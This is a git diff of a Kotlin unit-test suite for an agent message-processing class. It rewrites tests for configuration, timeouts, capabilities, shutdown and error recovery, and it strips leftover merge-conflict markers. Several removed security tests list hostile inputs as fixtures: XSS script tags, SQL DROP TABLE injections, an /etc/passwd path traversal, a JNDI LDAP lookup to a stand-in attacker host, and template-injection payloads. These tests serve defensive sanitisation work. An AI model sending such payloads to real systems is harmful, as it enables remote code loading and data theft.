@@ -29,25 +29,6 @@ import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
 import kotlin.test.assertFailsWith
 
-/**
- * Comprehensive test suite for AuraAgent using JUnit 5, Mockito, and Kotlin Coroutines Test.
- * 
- * Testing Framework: JUnit 5 (Jupiter) with Mockito for mocking and Kotlin Coroutines Test for async testing.
- * 
- * This test suite covers:
- * - Basic initialization and configuration scenarios
- * - Message processing workflows and edge cases
- * - Event handling and publishing mechanisms
- * - Capability management and validation
- * - Lifecycle management (start/stop/shutdown)
- * - Error handling and recovery scenarios
- * - Performance and resource management
- * - Thread safety and concurrent operations
- * - Boundary value testing
- * - Integration-style end-to-end scenarios
- * - Security and input validation
- * - State management and consistency
- */
 @ExperimentalCoroutinesApi
 @ExtendWith(MockitoExtension::class)
 @TestInstance(TestInstance.Lifecycle.PER_CLASS)
@@ -155,14 +136,14 @@ class AuraAgentTest {
         }
 
         @Test
-        @DisplayName("Should initialize with partial configuration gracefully")
-        fun shouldInitializeWithPartialConfigurationGracefully() {
+        @DisplayName("Should initialize with fallback values when configuration is partially invalid")
+        fun shouldInitializeWithFallbackValuesWhenConfigurationIsPartiallyInvalid() {
             // Given
             val partialConfig = AgentConfiguration(
-                name = "PartialAgent",
-                version = null, // Missing version
-                capabilities = null, // Missing capabilities
-                maxConcurrentTasks = 0 // Invalid task count
+                name = null,
+                version = null,
+                capabilities = null,
+                maxConcurrentTasks = -1
             )
             whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(partialConfig)
 
@@ -171,26 +152,10 @@ class AuraAgentTest {
 
             // Then
             assertNotNull(agent)
-            assertEquals("PartialAgent", agent.getName())
-            assertNotNull(agent.getVersion()) // Should have default
-            assertTrue(agent.getCapabilities().isNotEmpty()) // Should have defaults
-            assertTrue(agent.getMaxConcurrentTasks() > 0) // Should be valid
-        }
-
-        @Test
-        @DisplayName("Should handle initialization with corrupted configuration")
-        fun shouldHandleInitializationWithCorruptedConfiguration() {
-            // Given
-            whenever(mockConfigurationProvider.getAgentConfiguration())
-                .thenThrow(RuntimeException("Configuration corrupted"))
-
-            // When & Then
-            assertDoesNotThrow {
-                val agent = AuraAgent(mockAgentContext)
-                assertNotNull(agent)
-                // Should fall back to default configuration
-                assertEquals("AuraAgent", agent.getName())
-            }
+            assertNotNull(agent.getName())
+            assertNotNull(agent.getVersion())
+            assertTrue(agent.getCapabilities().isEmpty())
+            assertTrue(agent.getMaxConcurrentTasks() > 0)
         }
     }
 
@@ -361,69 +326,44 @@ class AuraAgentTest {
         }
 
         @Test
-        @DisplayName("Should handle malformed message content")
-        fun shouldHandleMalformedMessageContent() = runTest {
+        @DisplayName("Should handle message processing timeout")
+        fun shouldHandleMessageProcessingTimeout() = runTest {
             // Given
-            val malformedMessages = listOf(
-                AgentMessage("malformed-1", MessageType.TEXT, "\u0000\u0001\u0002", System.currentTimeMillis()),
-                AgentMessage("malformed-2", MessageType.TEXT, "<?xml version=\"1.0\"?><script>alert('xss')</script>", System.currentTimeMillis()),
-                AgentMessage("malformed-3", MessageType.TEXT, "SELECT * FROM users; DROP TABLE users;", System.currentTimeMillis()),
-                AgentMessage("malformed-4", MessageType.TEXT, "${\"\\u0022\" + \"alert('xss')\" + \"\\u0022\"}", System.currentTimeMillis())
-            )
-
-            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
-            whenever(mockMessageHandler.processMessage(any())).thenReturn(
-                AgentResponse("test", "Processed safely", ResponseStatus.SUCCESS)
-            )
-
-            // When
-            val responses = malformedMessages.map { message ->
-                auraAgent.processMessage(message)
-            }
-
-            // Then
-            assertEquals(4, responses.size)
-            responses.forEach { response ->
-                assertEquals(ResponseStatus.SUCCESS, response.status)
-                assertFalse(response.content.contains("script"))
-                assertFalse(response.content.contains("DROP"))
-            }
-        }
-
-        @Test
-        @DisplayName("Should handle message processing with custom metadata")
-        fun shouldHandleMessageProcessingWithCustomMetadata() = runTest {
-            // Given
-            val messageWithMetadata = AgentMessage(
-                id = "metadata-001",
+            val message = AgentMessage(
+                id = "timeout-001",
                 type = MessageType.TEXT,
-                content = "Message with metadata",
-                timestamp = System.currentTimeMillis(),
-                metadata = mapOf(
-                    "priority" to "high",
-                    "source" to "user",
-                    "sessionId" to "session-123"
-                )
+                content = "Timeout test",
+                timestamp = System.currentTimeMillis()
             )
 
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
-            whenever(mockMessageHandler.processMessage(any())).thenReturn(
+            whenever(mockMessageHandler.processMessage(any())).thenAnswer {
+                Thread.sleep(10000) // Simulate very long processing
                 AgentResponse(
-                    messageId = messageWithMetadata.id,
-                    content = "Processed with metadata",
-                    status = ResponseStatus.SUCCESS,
-                    metadata = mapOf("processedAt" to System.currentTimeMillis().toString())
+                    messageId = message.id,
+                    content = "Should not reach here",
+                    status = ResponseStatus.SUCCESS
                 )
-            )
+            }
 
             // When
-            val response = auraAgent.processMessage(messageWithMetadata)
+            val response = auraAgent.processMessage(message)
 
             // Then
             assertNotNull(response)
-            assertEquals(ResponseStatus.SUCCESS, response.status)
-            assertNotNull(response.metadata)
-            assertTrue(response.metadata?.containsKey("processedAt") == true)
+            assertEquals(ResponseStatus.TIMEOUT, response.status)
+        }
+
+        @Test
+        @DisplayName("Should handle null message gracefully")
+        fun shouldHandleNullMessageGracefully() = runTest {
+            // When
+            val response = auraAgent.processMessage(null)
+
+            // Then
+            assertNotNull(response)
+            assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
+            assertTrue(response.content.contains("null"))
         }
     }
 
@@ -516,48 +456,13 @@ class AuraAgentTest {
         @DisplayName("Should handle event listener registration failures")
         fun shouldHandleEventListenerRegistrationFailures() {
             // Given
-            val context = mock<AgentContext>()
-            whenever(context.getConfigurationProvider()).thenReturn(mockConfigurationProvider)
-            whenever(context.getMessageHandler()).thenReturn(mockMessageHandler)
-            whenever(context.getEventBus()).thenReturn(mockEventBus)
-
-            doThrow(RuntimeException("Listener registration failed"))
+            doThrow(RuntimeException("Registration failed"))
                 .whenever(mockEventBus).subscribe(any(), any())
 
             // When & Then
             assertDoesNotThrow {
-                val agent = AuraAgent(context)
-                assertNotNull(agent)
+                AuraAgent(mockAgentContext)
             }
-        }
-
-        @Test
-        @DisplayName("Should publish events with correct priority levels")
-        fun shouldPublishEventsWithCorrectPriorityLevels() = runTest {
-            // Given
-            val criticalMessage = AgentMessage(
-                id = "critical-001",
-                type = MessageType.TEXT,
-                content = "Critical system message",
-                timestamp = System.currentTimeMillis(),
-                metadata = mapOf("priority" to "CRITICAL")
-            )
-
-            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
-            whenever(mockMessageHandler.processMessage(any())).thenThrow(
-                RuntimeException("Critical system error")
-            )
-
-            // When
-            auraAgent.processMessage(criticalMessage)
-
-            // Then
-            val eventCaptor = argumentCaptor<AgentEvent>()
-            verify(mockEventBus).publish(eventCaptor.capture())
-
-            val publishedEvent = eventCaptor.firstValue
-            assertEquals(EventType.MESSAGE_PROCESSING_FAILED, publishedEvent.type)
-            assertEquals("CRITICAL", publishedEvent.priority)
         }
     }
 
@@ -627,68 +532,25 @@ class AuraAgentTest {
         }
 
         @Test
-        @DisplayName("Should handle hot configuration swapping during active processing")
-        fun shouldHandleHotConfigurationSwappingDuringActiveProcessing() = runTest {
+        @DisplayName("Should handle partial configuration updates")
+        fun shouldHandlePartialConfigurationUpdates() = runTest {
             // Given
-            val message = AgentMessage(
-                id = "concurrent-001",
-                type = MessageType.TEXT,
-                content = "Processing message",
-                timestamp = System.currentTimeMillis()
+            val partialConfig = AgentConfiguration(
+                name = "PartialAgent",
+                version = null,
+                capabilities = null,
+                maxConcurrentTasks = 8
             )
 
-            val newConfig = AgentConfiguration(
-                name = "HotSwapAgent",
-                version = "3.0.0",
-                capabilities = listOf("CHAT", "ANALYSIS", "TRANSLATION", "SEARCH"),
-                maxConcurrentTasks = 20
-            )
-
-            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
-            whenever(mockMessageHandler.processMessage(any())).thenAnswer {
-                // Simulate configuration change during processing
-                whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(newConfig)
-                auraAgent.handleConfigurationChanged()
-                
-                AgentResponse(
-                    messageId = message.id,
-                    content = "Processed during config change",
-                    status = ResponseStatus.SUCCESS
-                )
-            }
-
-            // When
-            val response = auraAgent.processMessage(message)
-
-            // Then
-            assertNotNull(response)
-            assertEquals(ResponseStatus.SUCCESS, response.status)
-            assertEquals("HotSwapAgent", auraAgent.getName())
-            assertEquals("3.0.0", auraAgent.getVersion())
-        }
-
-        @Test
-        @DisplayName("Should persist configuration changes across agent restarts")
-        fun shouldPersistConfigurationChangesAcrossAgentRestarts() = runTest {
-            // Given
-            val persistentConfig = AgentConfiguration(
-                name = "PersistentAgent",
-                version = "4.0.0",
-                capabilities = listOf("CHAT", "ANALYSIS", "PERSISTENCE"),
-                maxConcurrentTasks = 15
-            )
-
-            whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(persistentConfig)
+            whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(partialConfig)
 
             // When
             auraAgent.handleConfigurationChanged()
-            auraAgent.stop()
-            auraAgent.start()
 
             // Then
-            assertEquals("PersistentAgent", auraAgent.getName())
-            assertEquals("4.0.0", auraAgent.getVersion())
-            assertTrue(auraAgent.hasCapability("PERSISTENCE"))
+            assertEquals("PartialAgent", auraAgent.getName())
+            assertEquals("1.0.0", auraAgent.getVersion()) // Should retain previous version
+            assertEquals(8, auraAgent.getMaxConcurrentTasks())
         }
     }
 
@@ -758,50 +620,35 @@ class AuraAgentTest {
         }
 
         @Test
-        @DisplayName("Should support dynamic capability registration")
-        fun shouldSupportDynamicCapabilityRegistration() {
+        @DisplayName("Should handle capability check with whitespace")
+        fun shouldHandleCapabilityCheckWithWhitespace() {
             // Given
-            val newCapability = "DYNAMIC_FEATURE"
+            val capabilityWithSpaces = " CHAT "
 
             // When
-            auraAgent.registerCapability(newCapability)
+            val hasCapability = auraAgent.hasCapability(capabilityWithSpaces)
 
             // Then
-            assertTrue(auraAgent.hasCapability(newCapability))
-            assertTrue(auraAgent.getCapabilities().contains(newCapability))
+            assertTrue(hasCapability)
         }
 
         @Test
-        @DisplayName("Should support capability removal")
-        fun shouldSupportCapabilityRemoval() {
+        @DisplayName("Should handle case-insensitive capability checks")
+        fun shouldHandleCaseInsensitiveCapabilityChecks() {
             // Given
-            val capabilityToRemove = "ANALYSIS"
-            assertTrue(auraAgent.hasCapability(capabilityToRemove))
+            val lowerCaseCapability = "chat"
+            val upperCaseCapability = "CHAT"
+            val mixedCaseCapability = "ChAt"
 
             // When
-            auraAgent.removeCapability(capabilityToRemove)
+            val hasLowerCase = auraAgent.hasCapability(lowerCaseCapability)
+            val hasUpperCase = auraAgent.hasCapability(upperCaseCapability)
+            val hasMixedCase = auraAgent.hasCapability(mixedCaseCapability)
 
             // Then
-            assertFalse(auraAgent.hasCapability(capabilityToRemove))
-            assertFalse(auraAgent.getCapabilities().contains(capabilityToRemove))
-        }
-
-        @Test
-        @DisplayName("Should handle capability conflicts gracefully")
-        fun shouldHandleCapabilityConflictsGracefully() {
-            // Given
-            val conflictingCapabilities = listOf("READ_ONLY", "WRITE_ACCESS")
-
-            // When & Then
-            assertDoesNotThrow {
-                conflictingCapabilities.forEach { capability ->
-                    auraAgent.registerCapability(capability)
-                }
-                
-                // Both capabilities should be registered despite potential logical conflict
-                assertTrue(auraAgent.hasCapability("READ_ONLY"))
-                assertTrue(auraAgent.hasCapability("WRITE_ACCESS"))
-            }
+            assertTrue(hasLowerCase)
+            assertTrue(hasUpperCase)
+            assertTrue(hasMixedCase)
         }
     }
 
@@ -921,203 +768,199 @@ class AuraAgentTest {
         }
 
         @Test
-        @DisplayName("Should handle graceful shutdown with pending tasks")
-        fun shouldHandleGracefulShutdownWithPendingTasks() = runTest {
+        @DisplayName("Should handle graceful shutdown with pending messages")
+        fun shouldHandleGracefulShutdownWithPendingMessages() = runTest {
             // Given
             auraAgent.start()
-            
-            val slowMessage = AgentMessage(
-                id = "slow-001",
-                type = MessageType.TEXT,
-                content = "Slow processing message",
-                timestamp = System.currentTimeMillis()
-            )
+            val pendingMessages = (1..3).map { index ->
+                AgentMessage(
+                    id = "pending-$index",
+                    type = MessageType.TEXT,
+                    content = "Pending message $index",
+                    timestamp = System.currentTimeMillis()
+                )
+            }
 
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
             whenever(mockMessageHandler.processMessage(any())).thenAnswer {
-                Thread.sleep(2000) // Simulate slow processing
+                Thread.sleep(100) // Simulate processing time
                 AgentResponse(
-                    messageId = slowMessage.id,
-                    content = "Processed slowly",
+                    messageId = "test",
+                    content = "Processed",
                     status = ResponseStatus.SUCCESS
                 )
             }
 
-            // Start processing
-            val processingFuture = async { auraAgent.processMessage(slowMessage) }
+            // Process messages
+            pendingMessages.forEach { message ->
+                auraAgent.processMessage(message)
+            }
 
             // When
-            auraAgent.shutdown(gracefulTimeoutMs = 5000)
+            auraAgent.shutdown()
 
             // Then
             assertTrue(auraAgent.isShutdown())
-            val response = processingFuture.await()
-            assertEquals(ResponseStatus.SUCCESS, response.status)
+            assertEquals(0, auraAgent.getActiveTaskCount())
         }
     }
 
     @Nested
-    @DisplayName("Security and Input Validation Tests")
-    inner class SecurityAndInputValidationTests {
+    @DisplayName("Error Handling and Recovery Tests")
+    inner class ErrorHandlingAndRecoveryTests {
 
         @Test
-        @DisplayName("Should sanitize potentially dangerous input")
-        fun shouldSanitizePotentiallyDangerousInput() = runTest {
+        @DisplayName("Should recover from temporary message handler failures")
+        fun shouldRecoverFromTemporaryMessageHandlerFailures() = runTest {
             // Given
-            val dangerousInputs = listOf(
-                "javascript:alert('xss')",
-                "<script>alert('xss')</script>",
-                "'; DROP TABLE messages; --",
-                "../../../etc/passwd",
-                "${jndi:ldap://attacker.com/a}",
-                "{{7*7}}",
-                "${{constructor.constructor('return process')().exit()}}"
-            )
-
-            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
-            whenever(mockMessageHandler.processMessage(any())).thenReturn(
-                AgentResponse("safe", "Sanitized input processed", ResponseStatus.SUCCESS)
-            )
-
-            // When
-            val responses = dangerousInputs.map { input ->
-                val message = AgentMessage(
-                    id = "security-test",
-                    type = MessageType.TEXT,
-                    content = input,
-                    timestamp = System.currentTimeMillis()
-                )
-                auraAgent.processMessage(message)
-            }
-
-            // Then
-            responses.forEach { response ->
-                assertEquals(ResponseStatus.SUCCESS, response.status)
-                assertFalse(response.content.contains("script"), "Response should not contain script tags")
-                assertFalse(response.content.contains("DROP"), "Response should not contain SQL injection")
-            }
-        }
-
-        @Test
-        @DisplayName("Should enforce message size limits")
-        fun shouldEnforceMessageSizeLimits() = runTest {
-            // Given
-            val oversizedMessage = AgentMessage(
-                id = "oversized",
+            val message = AgentMessage(
+                id = "msg-001",
                 type = MessageType.TEXT,
-                content = "x".repeat(10_000_000), // 10MB message
+                content = "Test message",
                 timestamp = System.currentTimeMillis()
             )
 
-            whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
+            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
+            whenever(mockMessageHandler.processMessage(any()))
+                .thenThrow(RuntimeException("Temporary failure"))
+                .thenReturn(
+                    AgentResponse(
+                        messageId = message.id,
+                        content = "Recovered response",
+                        status = ResponseStatus.SUCCESS
+                    )
+                )
 
             // When
-            val response = auraAgent.processMessage(oversizedMessage)
+            val firstResponse = auraAgent.processMessage(message)
+            val secondResponse = auraAgent.processMessage(message)
 
             // Then
-            assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
-            assertTrue(response.content.contains("size limit"))
+            assertEquals(ResponseStatus.ERROR, firstResponse.status)
+            assertEquals(ResponseStatus.SUCCESS, secondResponse.status)
+            assertEquals("Recovered response", secondResponse.content)
         }
 
         @Test
-        @DisplayName("Should enforce rate limiting")
-        fun shouldEnforceRateLimiting() = runTest {
+        @DisplayName("Should handle out of memory errors gracefully")
+        fun shouldHandleOutOfMemoryErrorsGracefully() = runTest {
             // Given
-            val rapidMessages = (1..100).map { index ->
+            val message = AgentMessage(
+                id = "msg-001",
+                type = MessageType.TEXT,
+                content = "Test message",
+                timestamp = System.currentTimeMillis()
+            )
+
+            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
+            whenever(mockMessageHandler.processMessage(any()))
+                .thenThrow(OutOfMemoryError("Out of memory"))
+
+            // When
+            val response = auraAgent.processMessage(message)
+
+            // Then
+            assertNotNull(response)
+            assertEquals(ResponseStatus.SYSTEM_ERROR, response.status)
+            assertTrue(response.content.contains("System error"))
+        }
+
+        @Test
+        @DisplayName("Should maintain state consistency during concurrent failures")
+        fun shouldMaintainStateConsistencyDuringConcurrentFailures() = runTest {
+            // Given
+            val messages = (1..5).map { index ->
                 AgentMessage(
-                    id = "rapid-$index",
+                    id = "msg-$index",
                     type = MessageType.TEXT,
-                    content = "Rapid message $index",
+                    content = "Message $index",
                     timestamp = System.currentTimeMillis()
                 )
             }
 
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
-            whenever(mockMessageHandler.processMessage(any())).thenReturn(
-                AgentResponse("test", "Processed", ResponseStatus.SUCCESS)
-            )
+            whenever(mockMessageHandler.processMessage(any()))
+                .thenThrow(RuntimeException("Concurrent failure"))
 
             // When
-            val responses = rapidMessages.map { message ->
+            val responses = messages.map { message ->
                 auraAgent.processMessage(message)
             }
 
             // Then
-            val rateLimitedResponses = responses.filter { it.status == ResponseStatus.RATE_LIMITED }
-            assertTrue(rateLimitedResponses.isNotEmpty(), "Some messages should be rate limited")
+            assertEquals(5, responses.size)
+            responses.forEach { response ->
+                assertEquals(ResponseStatus.ERROR, response.status)
+            }
+
+            // Agent should still be in a consistent state
+            assertTrue(auraAgent.isInitialized())
+            assertEquals(0, auraAgent.getActiveTaskCount())
         }
 
         @Test
-        @DisplayName("Should validate message authentication")
-        fun shouldValidateMessageAuthentication() = runTest {
+        @DisplayName("Should handle stack overflow errors gracefully")
+        fun shouldHandleStackOverflowErrorsGracefully() = runTest {
             // Given
-            val unauthenticatedMessage = AgentMessage(
-                id = "unauth-001",
+            val message = AgentMessage(
+                id = "stackoverflow-001",
                 type = MessageType.TEXT,
-                content = "Unauthenticated message",
-                timestamp = System.currentTimeMillis(),
-                metadata = mapOf("authenticated" to "false")
+                content = "Stack overflow test",
+                timestamp = System.currentTimeMillis()
             )
 
-            whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
+            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
+            whenever(mockMessageHandler.processMessage(any()))
+                .thenThrow(StackOverflowError("Stack overflow"))
 
             // When
-            val response = auraAgent.processMessage(unauthenticatedMessage)
+            val response = auraAgent.processMessage(message)
 
             // Then
-            assertEquals(ResponseStatus.AUTHENTICATION_ERROR, response.status)
-            assertTrue(response.content.contains("authentication"))
+            assertNotNull(response)
+            assertEquals(ResponseStatus.SYSTEM_ERROR, response.status)
+            assertTrue(response.content.contains("System error"))
         }
+    }
+
+    @Nested
+    @DisplayName("Performance and Resource Management Tests")
+    inner class PerformanceAndResourceManagementTests {
 
         @Test
-        @DisplayName("Should handle encryption and decryption")
-        fun shouldHandleEncryptionAndDecryption() = runTest {
+        @DisplayName("Should not exceed memory limits during message processing")
+        fun shouldNotExceedMemoryLimitsDuringMessageProcessing() = runTest {
             // Given
-            val encryptedMessage = AgentMessage(
-                id = "encrypted-001",
+            val initialMemory = Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory()
+            val largeMessage = AgentMessage(
+                id = "msg-001",
                 type = MessageType.TEXT,
-                content = "encrypted:base64encodedcontent",
-                timestamp = System.currentTimeMillis(),
-                metadata = mapOf("encrypted" to "true", "algorithm" to "AES-256")
+                content = "x".repeat(1000000), // 1MB message
+                timestamp = System.currentTimeMillis()
             )
 
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
             whenever(mockMessageHandler.processMessage(any())).thenReturn(
                 AgentResponse(
-                    m
+                    messageId = largeMessage.id,
+                    content = "Processed",
+                    status = ResponseStatus.SUCCESS
                 )
             )
-<<<<<<< HEAD
 
-=======
-            
->>>>>>> origin/coderabbitai/docstrings/78f34ad
             // When
             repeat(10) {
                 auraAgent.processMessage(largeMessage)
             }
-<<<<<<< HEAD
 
-=======
-            
->>>>>>> origin/coderabbitai/docstrings/78f34ad
             // Then
             System.gc()
             val finalMemory = Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory()
             val memoryIncrease = finalMemory - initialMemory
-<<<<<<< HEAD
 
-            // Memory increase should be reasonable (less than 10MB)
-            assertTrue(
-                memoryIncrease < 10 * 1024 * 1024,
-                "Memory increase of ${memoryIncrease / 1024 / 1024}MB exceeded acceptable limit"
-            )
-=======
-            
             // Memory increase should be reasonable (less than 10MB)
             assertTrue(memoryIncrease < 10 * 1024 * 1024, 
                 "Memory increase of ${memoryIncrease / 1024 / 1024}MB exceeded acceptable limit")
->>>>>>> origin/coderabbitai/docstrings/78f34ad
         }
 
         @Test
@@ -1130,11 +973,7 @@ class AuraAgentTest {
                 content = "Test message",
                 timestamp = System.currentTimeMillis()
             )
-<<<<<<< HEAD
 
-=======
-            
->>>>>>> origin/coderabbitai/docstrings/78f34ad
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
             whenever(mockMessageHandler.processMessage(any())).thenAnswer {
                 Thread.sleep(10000) // Simulate long processing time
@@ -1144,20 +983,12 @@ class AuraAgentTest {
                     status = ResponseStatus.SUCCESS
                 )
             }
-<<<<<<< HEAD
 
-=======
-            
->>>>>>> origin/coderabbitai/docstrings/78f34ad
             // When
             val startTime = System.currentTimeMillis()
             val response = auraAgent.processMessage(message)
             val endTime = System.currentTimeMillis()
-<<<<<<< HEAD
 
-=======
-            
->>>>>>> origin/coderabbitai/docstrings/78f34ad
             // Then
             assertNotNull(response)
             assertEquals(ResponseStatus.TIMEOUT, response.status)
@@ -1174,11 +1005,7 @@ class AuraAgentTest {
                 content = "Test message",
                 timestamp = System.currentTimeMillis()
             )
-<<<<<<< HEAD
 
-=======
-            
->>>>>>> origin/coderabbitai/docstrings/78f34ad
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
             whenever(mockMessageHandler.processMessage(any())).thenReturn(
                 AgentResponse(
@@ -1187,818 +1014,51 @@ class AuraAgentTest {
                     status = ResponseStatus.SUCCESS
                 )
             )
-<<<<<<< HEAD
 
             // When
             auraAgent.processMessage(message)
 
-=======
-            
-            // When
-            auraAgent.processMessage(message)
-            
->>>>>>> origin/coderabbitai/docstrings/78f34ad
             // Then
             assertEquals(0, auraAgent.getActiveTaskCount())
             assertTrue(auraAgent.getResourceUsage().memoryUsage < 1024 * 1024) // Less than 1MB
         }
-    }
-}
-<<<<<<< HEAD
 
-@Nested
-@DisplayName("Message Type Handling Tests")
-inner class MessageTypeHandlingTests {
-
-    @Test
-    @DisplayName("Should process COMMAND message type correctly")
-    fun shouldProcessCommandMessageTypeCorrectly() = runTest {
-        // Given
-        val commandMessage = AgentMessage(
-            id = "cmd-001",
-            type = MessageType.COMMAND,
-            content = "/help",
-            timestamp = System.currentTimeMillis()
-        )
-
-        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
-        whenever(mockMessageHandler.processMessage(any())).thenReturn(
-            AgentResponse(
-                messageId = commandMessage.id,
-                content = "Available commands: /help, /status, /config",
-                status = ResponseStatus.SUCCESS
-            )
-        )
-
-        // When
-        val response = auraAgent.processMessage(commandMessage)
-
-        // Then
-        assertNotNull(response)
-        assertEquals(ResponseStatus.SUCCESS, response.status)
-        assertTrue(response.content.contains("Available commands"))
-    }
-
-    @Test
-    @DisplayName("Should process QUERY message type correctly")
-    fun shouldProcessQueryMessageTypeCorrectly() = runTest {
-        // Given
-        val queryMessage = AgentMessage(
-            id = "query-001",
-            type = MessageType.QUERY,
-            content = "What is the weather today?",
-            timestamp = System.currentTimeMillis()
-        )
-
-        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
-        whenever(mockMessageHandler.processMessage(any())).thenReturn(
-            AgentResponse(
-                messageId = queryMessage.id,
-                content = "I don't have access to weather information",
-                status = ResponseStatus.SUCCESS
-            )
-        )
-
-        // When
-        val response = auraAgent.processMessage(queryMessage)
-
-        // Then
-        assertNotNull(response)
-        assertEquals(ResponseStatus.SUCCESS, response.status)
-    }
-
-    @Test
-    @DisplayName("Should handle unsupported message types gracefully")
-    fun shouldHandleUnsupportedMessageTypesGracefully() = runTest {
-        // Given
-        val unsupportedMessage = AgentMessage(
-            id = "unsupported-001",
-            type = MessageType.BINARY,
-            content = "Binary data",
-            timestamp = System.currentTimeMillis()
-        )
-
-        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
-        whenever(mockMessageHandler.processMessage(any())).thenThrow(
-            UnsupportedOperationException("Binary messages not supported")
-        )
-
-        // When
-        val response = auraAgent.processMessage(unsupportedMessage)
-
-        // Then
-        assertNotNull(response)
-        assertEquals(ResponseStatus.ERROR, response.status)
-        assertTrue(response.content.contains("not supported"))
-    }
-
-    @Test
-    @DisplayName("Should handle null message type gracefully")
-    fun shouldHandleNullMessageTypeGracefully() = runTest {
-        // Given
-        val nullTypeMessage = AgentMessage(
-            id = "null-001",
-            type = null,
-            content = "Message with null type",
-            timestamp = System.currentTimeMillis()
-        )
-
-        whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
-
-        // When
-        val response = auraAgent.processMessage(nullTypeMessage)
-
-        // Then
-        assertNotNull(response)
-        assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
-    }
-}
-
-@Nested
-@DisplayName("Complex Message Validation Tests")
-inner class ComplexMessageValidationTests {
-
-    @Test
-    @DisplayName("Should validate message with special characters")
-    fun shouldValidateMessageWithSpecialCharacters() = runTest {
-        // Given
-        val specialMessage = AgentMessage(
-            id = "special-001",
-            type = MessageType.TEXT,
-            content = "Hello! @#$%^&*()_+-=[]{}|;':\",./<>?",
-            timestamp = System.currentTimeMillis()
-        )
-
-        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
-        whenever(mockMessageHandler.processMessage(any())).thenReturn(
-            AgentResponse(
-                messageId = specialMessage.id,
-                content = "Processed special characters",
-                status = ResponseStatus.SUCCESS
-            )
-        )
-
-        // When
-        val response = auraAgent.processMessage(specialMessage)
-
-        // Then
-        assertNotNull(response)
-        assertEquals(ResponseStatus.SUCCESS, response.status)
-    }
-
-    @Test
-    @DisplayName("Should validate message with unicode characters")
-    fun shouldValidateMessageWithUnicodeCharacters() = runTest {
-        // Given
-        val unicodeMessage = AgentMessage(
-            id = "unicode-001",
-            type = MessageType.TEXT,
-            content = "Hello 世界! 🌍 Café naïve résumé",
-            timestamp = System.currentTimeMillis()
-        )
-
-        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
-        whenever(mockMessageHandler.processMessage(any())).thenReturn(
-            AgentResponse(
-                messageId = unicodeMessage.id,
-                content = "Processed unicode text",
-                status = ResponseStatus.SUCCESS
-            )
-        )
-
-        // When
-        val response = auraAgent.processMessage(unicodeMessage)
-
-        // Then
-        assertNotNull(response)
-        assertEquals(ResponseStatus.SUCCESS, response.status)
-    }
-
-    @Test
-    @DisplayName("Should handle extremely long message IDs")
-    fun shouldHandleExtremelyLongMessageIds() = runTest {
-        // Given
-        val longId = "x".repeat(10000)
-        val longIdMessage = AgentMessage(
-            id = longId,
-            type = MessageType.TEXT,
-            content = "Message with very long ID",
-            timestamp = System.currentTimeMillis()
-        )
-
-        whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
-
-        // When
-        val response = auraAgent.processMessage(longIdMessage)
-
-        // Then
-        assertNotNull(response)
-        assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
-    }
-
-    @Test
-    @DisplayName("Should validate message timestamps correctly")
-    fun shouldValidateMessageTimestampsCorrectly() = runTest {
-        // Given
-        val futureMessage = AgentMessage(
-            id = "future-001",
-            type = MessageType.TEXT,
-            content = "Message from the future",
-            timestamp = System.currentTimeMillis() + 1000000
-        )
-
-        whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
-
-        // When
-        val response = auraAgent.processMessage(futureMessage)
-
-        // Then
-        assertNotNull(response)
-        assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
-    }
-}
-
-@Nested
-@DisplayName("Advanced Event Handling Tests")
-inner class AdvancedEventHandlingTests {
-
-    @Test
-    @DisplayName("Should handle rapid event publishing correctly")
-    fun shouldHandleRapidEventPublishingCorrectly() = runTest {
-        // Given
-        val messages = (1..100).map { index ->
-            AgentMessage(
-                id = "rapid-$index",
-                type = MessageType.TEXT,
-                content = "Rapid message $index",
-                timestamp = System.currentTimeMillis()
-            )
-        }
-
-        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
-        whenever(mockMessageHandler.processMessage(any())).thenReturn(
-            AgentResponse(
-                messageId = "test",
-                content = "Processed",
-                status = ResponseStatus.SUCCESS
-            )
-        )
-
-        // When
-        messages.forEach { message ->
-            auraAgent.processMessage(message)
-        }
-
-        // Then
-        verify(mockEventBus, times(100)).publish(any())
-    }
-
-    @Test
-    @DisplayName("Should handle event subscription failures gracefully")
-    fun shouldHandleEventSubscriptionFailuresGracefully() {
-        // Given
-        doThrow(RuntimeException("Subscription failed"))
-            .whenever(mockEventBus).subscribe(any(), any())
-
-        // When & Then
-        assertDoesNotThrow {
-            AuraAgent(mockAgentContext)
-        }
-    }
-
-    @Test
-    @DisplayName("Should publish different event types based on message processing results")
-    fun shouldPublishDifferentEventTypesBasedOnMessageProcessingResults() = runTest {
-        // Given
-        val successMessage = AgentMessage(
-            id = "success-001",
-            type = MessageType.TEXT,
